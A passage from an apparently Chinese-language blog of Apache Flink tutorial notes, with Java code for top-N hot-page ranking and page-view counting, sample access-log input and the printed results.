class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">merge</span><span class="params">(Long a, Long b)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> a + b;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 实现自定义的窗口函数</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">PageCountResult</span> <span class="keyword">implements</span> <span class="title">WindowFunction</span>&lt;<span class="title">Long</span>, <span class="title">PageViewCount</span>, <span class="title">String</span>, <span class="title">TimeWindow</span>&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">apply</span><span class="params">(String url, TimeWindow window, Iterable&lt;Long&gt; input, Collector&lt;PageViewCount&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      out.collect(<span class="keyword">new</span> PageViewCount(url, window.getEnd(), input.iterator().next()));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 实现自定义的处理函数</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">TopNHotPages</span> <span class="keyword">extends</span> <span class="title">KeyedProcessFunction</span>&lt;<span class="title">Long</span>, <span class="title">PageViewCount</span>, <span class="title">String</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Integer topSize;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TopNHotPages</span><span class="params">(Integer topSize)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.topSize = topSize;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义状态，保存当前所有PageViewCount到Map中</span></span><br><span class="line">    <span class="comment">//        ListState&lt;PageViewCount&gt; pageViewCountListState;</span></span><br><span class="line">    MapState&lt;String, Long&gt; pageViewCountMapState;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration parameters)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">//            pageViewCountListState = getRuntimeContext().getListState(new ListStateDescriptor&lt;PageViewCount&gt;(&quot;page-count-list&quot;, PageViewCount.class));</span></span><br><span class="line">      pageViewCountMapState = getRuntimeContext().getMapState(<span class="keyword">new</span> MapStateDescriptor&lt;String, Long&gt;(<span class="string">&quot;page-count-map&quot;</span>, String.class, Long.class));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement</span><span class="params">(PageViewCount value, Context ctx, Collector&lt;String&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">//            pageViewCountListState.add(value);</span></span><br><span class="line">      pageViewCountMapState.put(value.getUrl(), value.getCount());</span><br><span class="line">      ctx.timerService().registerEventTimeTimer(value.getWindowEnd() + <span class="number">1</span>);</span><br><span class="line">      <span class="comment">// 注册一个1分钟之后的定时器，用来清空状态</span></span><br><span class="line">      ctx.timerService().registerEventTimeTimer(value.getWindowEnd() + <span class="number">60</span> * <span class="number">1000L</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onTimer</span><span class="params">(<span class="keyword">long</span> timestamp, OnTimerContext ctx, Collector&lt;String&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">// 先判断是否到了窗口关闭清理时间，如果是，直接清空状态返回</span></span><br><span class="line">      <span class="keyword">if</span> (timestamp == ctx.getCurrentKey() + <span class="number">60</span> * <span class="number">1000L</span>) &#123;</span><br><span class="line">        pageViewCountMapState.clear();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="comment">//            ArrayList&lt;PageViewCount&gt; pageViewCounts = Lists.newArrayList(pageViewCountListState.get().iterator());</span></span><br><span class="line">      ArrayList&lt;Map.Entry&lt;String, Long&gt;&gt; pageViewCounts = Lists.newArrayList(pageViewCountMapState.entries().iterator());</span><br><span class="line"></span><br><span class="line">      pageViewCounts.sort((a, b) -&gt; -Long.compare(a.getValue(), b.getValue()));</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 格式化成String输出</span></span><br><span class="line">      StringBuilder resultBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">      resultBuilder.append(<span class="string">&quot;============================&quot;</span>).append(System.lineSeparator());</span><br><span class="line">      resultBuilder.append(<span class="string">&quot;窗口结束时间：&quot;</span>).append(<span class="keyword">new</span> Timestamp(timestamp - <span class="number">1</span>)).append(System.lineSeparator());</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 遍历列表，取top n输出</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; Math.min(topSize, pageViewCounts.size()); i++) &#123;</span><br><span class="line">        <span class="comment">//                PageViewCount pageViewCount = pageViewCounts.get(i);</span></span><br><span class="line">        Map.Entry&lt;String, Long&gt; pageViewCount = pageViewCounts.get(i);</span><br><span class="line">        resultBuilder.append(<span class="string">&quot;NO &quot;</span>).append(i + <span class="number">1</span>).append(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">          .append(<span class="string">&quot; 页面URL = &quot;</span>).append(pageViewCount.getKey())</span><br><span class="line">          .append(<span class="string">&quot; 浏览量 = &quot;</span>).append(pageViewCount.getValue())</span><br><span class="line">          .append(System.lineSeparator());</span><br><span class="line">      &#125;</span><br><span class="line">      resultBuilder.append(<span class="string">&quot;===============================&quot;</span>).append(System.lineSeparator());</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 控制输出频率</span></span><br><span class="line">      Thread.sleep(<span class="number">1000L</span>);</span><br><span class="line"></span><br><span class="line">      out.collect(resultBuilder.toString());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="comment">//            pageViewCountListState.clear();</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> 输入  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">83.149.9.216 - - 17/05/2015:10:25:49 +0000 GET /presentations/</span><br><span class="line">83.149.9.216 - - 17/05/2015:10:25:50 +0000 GET /presentations/</span><br><span class="line">83.149.9.216 - - 17/05/2015:10:25:51 +0000 GET /presentations/</span><br><span class="line">83.149.9.216 - - 17/05/2015:10:25:52 +0000 GET /presentations/</span><br><span class="line">83.149.9.216 - - 17/05/2015:10:25:55 +0000 GET /presentations/</span><br><span class="line">83.149.9.216 - - 17/05/2015:10:25:56 +0000 GET /presentations/</span><br><span class="line">83.149.9.216 - - 17/05/2015:10:25:56 +0000 GET /present</span><br><span class="line">83.149.9.216 - - 17/05/2015:10:25:57 +0000 GET /present</span><br><span class="line">83.149.9.216 - - 17/05/2015:10:26:01 +0000 GET /</span><br><span class="line">83.149.9.216 - - 17/05/2015:10:26:02 +0000 GET /pre</span><br><span class="line">83.149.9.216 - - 17/05/2015:10:25:46 +0000 GET /presentations/</span><br><span class="line">83.149.9.216 - - 17/05/2015:10:26:03 +0000 GET /pre</span><br></pre></td></tr></table></figure></li><li><p> 输出  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">data&gt;</span><span class="bash"> ApacheLogEvent&#123;ip=<span class="string">&#x27;83.149.9.216&#x27;</span>, userId=<span class="string">&#x27;-&#x27;</span>, timestamp=1431829549000, method=<span class="string">&#x27;GET&#x27;</span>, url=<span class="string">&#x27;/presentations/&#x27;</span>&#125;</span></span><br><span class="line"><span class="meta">data&gt;</span><span class="bash"> ApacheLogEvent&#123;ip=<span class="string">&#x27;83.149.9.216&#x27;</span>, userId=<span class="string">&#x27;-&#x27;</span>, timestamp=1431829550000, method=<span class="string">&#x27;GET&#x27;</span>, url=<span class="string">&#x27;/presentations/&#x27;</span>&#125;</span></span><br><span class="line"><span class="meta">data&gt;</span><span class="bash"> ApacheLogEvent&#123;ip=<span class="string">&#x27;83.149.9.216&#x27;</span>, userId=<span class="string">&#x27;-&#x27;</span>, timestamp=1431829551000, method=<span class="string">&#x27;GET&#x27;</span>, url=<span class="string">&#x27;/presentations/&#x27;</span>&#125;</span></span><br><span class="line"><span class="meta">data&gt;</span><span class="bash"> ApacheLogEvent&#123;ip=<span class="string">&#x27;83.149.9.216&#x27;</span>, userId=<span class="string">&#x27;-&#x27;</span>, timestamp=1431829552000, method=<span class="string">&#x27;GET&#x27;</span>, url=<span class="string">&#x27;/presentations/&#x27;</span>&#125;</span></span><br><span class="line"><span class="meta">data&gt;</span><span class="bash"> ApacheLogEvent&#123;ip=<span class="string">&#x27;83.149.9.216&#x27;</span>, userId=<span class="string">&#x27;-&#x27;</span>, timestamp=1431829555000, method=<span class="string">&#x27;GET&#x27;</span>, url=<span class="string">&#x27;/presentations/&#x27;</span>&#125;</span></span><br><span class="line"><span class="meta">data&gt;</span><span class="bash"> ApacheLogEvent&#123;ip=<span class="string">&#x27;83.149.9.216&#x27;</span>, userId=<span class="string">&#x27;-&#x27;</span>, timestamp=1431829556000, method=<span class="string">&#x27;GET&#x27;</span>, url=<span class="string">&#x27;/presentations/&#x27;</span>&#125;</span></span><br><span class="line"><span class="meta">data&gt;</span><span class="bash"> ApacheLogEvent&#123;ip=<span class="string">&#x27;83.149.9.216&#x27;</span>, userId=<span class="string">&#x27;-&#x27;</span>, timestamp=1431829556000, method=<span class="string">&#x27;GET&#x27;</span>, url=<span class="string">&#x27;/present&#x27;</span>&#125;</span></span><br><span class="line"><span class="meta">data&gt;</span><span class="bash"> ApacheLogEvent&#123;ip=<span class="string">&#x27;83.149.9.216&#x27;</span>, userId=<span class="string">&#x27;-&#x27;</span>, timestamp=1431829557000, method=<span class="string">&#x27;GET&#x27;</span>, url=<span class="string">&#x27;/present&#x27;</span>&#125;</span></span><br><span class="line"><span class="meta">data&gt;</span><span class="bash"> ApacheLogEvent&#123;ip=<span class="string">&#x27;83.149.9.216&#x27;</span>, userId=<span class="string">&#x27;-&#x27;</span>, timestamp=1431829561000, method=<span class="string">&#x27;GET&#x27;</span>, url=<span class="string">&#x27;/&#x27;</span>&#125;</span></span><br><span class="line"><span class="meta">data&gt;</span><span class="bash"> ApacheLogEvent&#123;ip=<span class="string">&#x27;83.149.9.216&#x27;</span>, userId=<span class="string">&#x27;-&#x27;</span>, timestamp=1431829562000, method=<span class="string">&#x27;GET&#x27;</span>, url=<span class="string">&#x27;/pre&#x27;</span>&#125;</span></span><br><span class="line"><span class="meta">data&gt;</span><span class="bash"> ApacheLogEvent&#123;ip=<span class="string">&#x27;83.149.9.216&#x27;</span>, userId=<span class="string">&#x27;-&#x27;</span>, timestamp=1431829546000, method=<span class="string">&#x27;GET&#x27;</span>, url=<span class="string">&#x27;/presentations/&#x27;</span>&#125;</span></span><br><span class="line"><span class="meta">agg&gt;</span><span class="bash"> PageViewCount&#123;url=<span class="string">&#x27;/presentations/&#x27;</span>, windowEnd=1431829550000, count=2&#125;</span></span><br><span class="line"><span class="meta">agg&gt;</span><span class="bash"> PageViewCount&#123;url=<span class="string">&#x27;/presentations/&#x27;</span>, windowEnd=1431829555000, count=5&#125;</span></span><br><span class="line"><span class="meta">agg&gt;</span><span class="bash"> PageViewCount&#123;url=<span class="string">&#x27;/presentations/&#x27;</span>, windowEnd=1431829560000, count=7&#125;</span></span><br><span class="line"><span class="meta">agg&gt;</span><span class="bash"> PageViewCount&#123;url=<span class="string">&#x27;/present&#x27;</span>, windowEnd=1431829560000, count=2&#125;</span></span><br><span class="line"><span class="meta">data&gt;</span><span class="bash"> ApacheLogEvent&#123;ip=<span class="string">&#x27;83.149.9.216&#x27;</span>, userId=<span class="string">&#x27;-&#x27;</span>, timestamp=1431829563000, method=<span class="string">&#x27;GET&#x27;</span>, url=<span class="string">&#x27;/pre&#x27;</span>&#125;</span></span><br><span class="line">============================</span><br><span class="line">窗口结束时间：2015-05-17 10:25:50.0</span><br><span class="line">NO 1: 页面URL = /presentations/ 浏览量 = 2</span><br><span class="line">===============================</span><br><span class="line"></span><br><span class="line">============================</span><br><span class="line">窗口结束时间：2015-05-17 10:25:55.0</span><br><span class="line">NO 1: 页面URL = /presentations/ 浏览量 = 5</span><br><span class="line">===============================</span><br><span class="line"></span><br><span class="line">============================</span><br><span class="line">窗口结束时间：2015-05-17 10:26:00.0</span><br><span class="line">NO 1: 页面URL = /presentations/ 浏览量 = 7</span><br><span class="line">NO 2: 页面URL = /present 浏览量 = 2</span><br><span class="line">===============================</span><br></pre></td></tr></table></figure></li></ul><h5 id="实时流量统计——PV和UV"><a href="#实时流量统计——PV和UV" class="headerlink" title="实时流量统计——PV和UV"></a>实时流量统计——PV和UV</h5><ul><li>基本需求 <ul><li>从埋点日志中，统计实时的PV和UV</li><li>统计每小时的访问量（PV），并且对用户进行去重（UV）</li></ul></li><li>解决思路 <ul><li>统计埋点日志中的pv行为，利用Set数据结构进行去重</li><li><strong>对于超大规模的数据，可以考虑用布隆过滤器进行去重</strong></li></ul></li></ul><h6 id="代码1-PV统计-基本实现"><a href="#代码1-PV统计-基本实现" class="headerlink" title="代码1-PV统计-基本实现"></a>代码1-PV统计-基本实现</h6><ul><li><p> java代码  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> beans.UserBehavior;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.MapFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.tuple.Tuple2;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.timestamps.BoundedOutOfOrdernessTimestampExtractor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.assigners.TumblingEventTimeWindows;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.runtime.operators.util.AssignerWithPeriodicWatermarksAdapter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/5 3:11 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PageView</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 1. 创建执行环境</span></span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    <span class="comment">// 设置并行度为1</span></span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 从csv文件中获取数据</span></span><br><span class="line">    URL resource = PageView.class.getResource(<span class="string">&quot;/UserBehavior.csv&quot;</span>);</span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.readTextFile(resource.getPath());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 转换成POJO,分配时间戳和watermark</span></span><br><span class="line">    DataStream&lt;UserBehavior&gt; userBehaviorDataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">      String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> UserBehavior(<span class="keyword">new</span> Long(fields[<span class="number">0</span>]), <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Integer(fields[<span class="number">2</span>]), fields[<span class="number">3</span>], <span class="keyword">new</span> Long(fields[<span class="number">4</span>]));</span><br><span class="line">    &#125;).assignTimestampsAndWatermarks(<span class="keyword">new</span> AssignerWithPeriodicWatermarksAdapter.Strategy&lt;&gt;(</span><br><span class="line">      <span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;UserBehavior&gt;(Time.of(<span class="number">200</span>, TimeUnit.MILLISECONDS)) &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(UserBehavior element)</span> </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> element.getTimestamp() * <span class="number">1000L</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 分组开窗聚合，得到每个窗口内各个商品的count值</span></span><br><span class="line">    DataStream&lt;Tuple2&lt;String, Long&gt;&gt; pvResultStream = userBehaviorDataStream</span><br><span class="line">      <span class="comment">// 过滤只保留pv行为</span></span><br><span class="line">      .filter(userBehavior -&gt; <span class="string">&quot;pv&quot;</span>.equals(userBehavior.getBehavior()))</span><br><span class="line">      .map(<span class="keyword">new</span> MapFunction&lt;UserBehavior, Tuple2&lt;String, Long&gt;&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Tuple2&lt;String, Long&gt; <span class="title">map</span><span class="params">(UserBehavior value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">new</span> Tuple2&lt;&gt;(<span class="string">&quot;pv&quot;</span>, <span class="number">1L</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">      <span class="comment">// 按照商品ID分组</span></span><br><span class="line">      .keyBy(item -&gt; item.f0)</span><br><span class="line">      <span class="comment">// 1小时滚动窗口</span></span><br><span class="line">      .window(TumblingEventTimeWindows.of(Time.hours(<span class="number">1</span>)))</span><br><span class="line">      .sum(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    pvResultStream.print();</span><br><span class="line"></span><br><span class="line">    env.execute(<span class="string">&quot;pv count job&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> 输出  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(pv,41890)</span><br><span class="line">(pv,48022)</span><br><span class="line">(pv,47298)</span><br><span class="line">(pv,44499)</span><br><span class="line">(pv,48649)</span><br><span class="line">(pv,50838)</span><br><span class="line">(pv,52296)</span><br><span class="line">(pv,52552)</span><br><span class="line">(pv,48292)</span><br><span class="line">(pv,13)</span><br></pre></td></tr></table></figure></li></ul><h6 id="代码2-PV统计-并行和数据倾斜优化"><a href="#代码2-PV统计-并行和数据倾斜优化" class="headerlink" title="代码2 PV统计-并行和数据倾斜优化"></a>代码2 PV统计-并行和数据倾斜优化</h6><ul><li><p> java代码  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> beans.PageViewCount;</span><br><span class="line"><span class="keyword">import</span> beans.UserBehavior;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.AggregateFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.MapFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ValueState;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ValueStateDescriptor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.tuple.Tuple2;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.configuration.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.SingleOutputStreamOperator;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.KeyedProcessFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.timestamps.BoundedOutOfOrdernessTimestampExtractor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.windowing.WindowFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.assigners.TumblingEventTimeWindows;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.windows.TimeWindow;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.runtime.operators.util.AssignerWithPeriodicWatermarksAdapter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.Collector;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/5 3:11 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PageView</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 1. 创建执行环境</span></span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    <span class="comment">// 设置并行度为4</span></span><br><span class="line">    env.setParallelism(<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 从csv文件中获取数据</span></span><br><span class="line">    URL resource = PageView.class.getResource(<span class="string">&quot;/UserBehavior.csv&quot;</span>);</span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.readTextFile(resource.getPath());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 转换成POJO,分配时间戳和watermark</span></span><br><span class="line">    DataStream&lt;UserBehavior&gt; userBehaviorDataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">      String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> UserBehavior(<span class="keyword">new</span> Long(fields[<span class="number">0</span>]), <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Integer(fields[<span class="number">2</span>]), fields[<span class="number">3</span>], <span class="keyword">new</span> Long(fields[<span class="number">4</span>]));</span><br><span 